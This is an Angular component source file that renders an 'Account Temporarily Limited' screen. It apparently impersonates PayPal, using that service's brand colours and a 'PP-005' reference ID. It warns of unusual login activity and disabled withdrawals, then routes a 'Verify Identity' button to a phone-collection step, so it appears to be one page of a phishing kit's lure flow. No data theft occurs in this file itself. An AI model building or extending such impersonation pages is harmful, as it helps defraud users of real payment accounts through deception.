import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-limited-access',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center text-center relative">
        <!-- Icon -->
        <div class="w-16 h-16 rounded-full bg-amber-50 border border-amber-100 flex items-center justify-center mb-6">
          <span class="material-icons-outlined text-3xl text-amber-600">gpp_maybe</span>
        </div>
        
        <h1 class="text-xl font-bold text-slate-900 mb-3">
          Account Temporarily Limited
        </h1>
        
        <p class="text-sm text-slate-600 leading-relaxed mb-8 max-w-sm">
          We've noticed some unusual activity on your account. To ensure your security, we need you to confirm your identity before restoring full access.
        </p>

        <div class="w-full space-y-4">
          <button 
            (click)="verify()"
            class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-200 shadow-sm text-[15px]"
          >
            Verify Identity
          </button>

          <button 
            (click)="showDialog.set(true)"
            class="w-full text-[#0070ba] font-semibold text-sm hover:underline py-2"
          >
            Why is my account limited?
          </button>
        </div>
      </div>
      
      <!-- Popup Dialog -->
      @if (showDialog()) {
        <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
           <div class="absolute inset-0 bg-black/40 backdrop-blur-sm" (click)="showDialog.set(false)"></div>
           <div class="bg-white rounded-xl shadow-2xl w-full max-w-md p-6 relative z-10 animate-in fade-in zoom-in duration-200">
              <div class="flex justify-between items-start mb-4">
                 <h3 class="font-bold text-lg text-slate-900">Limitation Details</h3>
                 <button (click)="showDialog.set(false)" class="text-slate-400 hover:text-slate-700">
                    <span class="material-icons">close</span>
                 </button>
              </div>
              <div class="space-y-4 text-sm text-slate-600">
                 <p>Reference ID: <strong>PP-005-{{ state.sessionId() }}</strong></p>
                 <div class="bg-amber-50 border-l-4 border-amber-500 p-3">
                    <p class="font-bold text-amber-800">Unusual Login Attempt</p>
                    <p class="text-xs mt-1">We detected a login from a new device or location that doesn't match your history.</p>
                 </div>
                 <p>For your protection, certain account features including sending, withdrawing, and closing your account have been disabled.</p>
              </div>
              <button (click)="showDialog.set(false)" class="w-full mt-6 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3 rounded-lg transition-colors">
                 Close
              </button>
           </div>
        </div>
      }
    </app-public-layout>
  `
})
export class LimitedAccessComponent {
  state = inject(StateService);
  showDialog = signal(false);

  verify() {
    this.state.navigate('phone');
  }
}